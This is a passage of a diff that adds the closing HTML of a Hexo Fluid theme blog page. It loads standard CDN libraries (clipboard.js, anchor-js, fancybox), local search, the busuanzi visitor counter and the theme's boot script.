+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
